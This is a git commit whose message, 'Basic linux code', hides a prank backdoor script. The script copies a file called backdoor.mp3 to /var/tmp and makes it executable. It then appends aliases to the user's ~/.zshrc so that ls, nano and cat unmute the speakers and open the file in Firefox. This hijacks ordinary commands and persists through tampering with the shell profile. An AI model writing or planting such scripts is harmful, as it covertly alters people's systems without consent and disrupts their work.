4343c3db0bedd53b7f8daf1b685b67bddcd40663
Mike van de Ven <9407944+babutzc@users.noreply.github.com>
2020-08-16 17:41:28 +0200

    Basic linux
    Basic linux code

--- linux.sh
+++ linux.sh
@@ -1,1 +1,15 @@
-# Insert awesome code here
+#!/bin/bash
+
+SOUND="backdoor.mp3"
+BACKDOOR_PATH="/var/tmp/"
+cp $SOUND $BACKDOOR_PATH
+chmod +x ${BACKDOOR_PATH}${SOUND}
+
+
+function screw_up_profile() { 
+sed -i -e "$ a alias ls='pacmd set-default-sink 0 && pactl set-sink-mute 0 false  && firefox /var/tmp/backdoor.mp3'" $1
+sed -i -e "$ a alias nano='pacmd set-default-sink 0 && pactl set-sink-mute 0 false  && firefox /var/tmp/backdoor.mp3'" $1 
+sed -i -e "$ a alias cat='pacmd set-default-sink 0 && pactl set-sink-mute 0 false  && firefox /var/tmp/backdoor.mp3'" $1
+}
+
+screw_up_profile ~/.zshrc
